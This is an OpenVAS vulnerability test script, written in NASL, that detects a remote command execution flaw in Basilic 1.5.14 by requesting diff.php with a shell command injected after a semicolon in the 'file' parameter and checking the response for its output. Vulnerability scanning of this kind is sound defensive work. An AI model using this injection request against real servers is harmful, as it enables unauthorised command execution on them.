###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_basilic_54234.nasl 12021 2018-10-22 14:54:51Z mmartin $
#
# Basilic 'diff.php' Remote Command Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103504");
  script_bugtraq_id(54234);
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:P");
  script_version("$Revision: 12021 $");
  script_name("Basilic 'diff.php' Remote Command Execution Vulnerability");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54234");
  script_xref(name:"URL", value:"http://artis.imag.fr/Software/Basilic/");
  script_tag(name:"last_modification", value:"$Date: 2018-10-22 16:54:51 +0200 (Mon, 22 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-02 10:46:56 +0200 (Mon, 02 Jul 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Basilic is prone to a remote command-execution vulnerability.

An attacker can exploit this issue to execute arbitrary commands
within the context of the vulnerable application.

Basilic 1.5.14 is vulnerable. Other versions may also be affected.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features,
remove the product or replace the product by another one.");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

commands = exploit_commands();

foreach dir( make_list_unique( "/basilic", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach cmd( keys( commands ) ) {

    url = dir + "/Config/diff.php?file=;" + commands[cmd] + "&new=1&old=2";
    if(http_vuln_check(port:port, url:url,pattern:cmd)) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
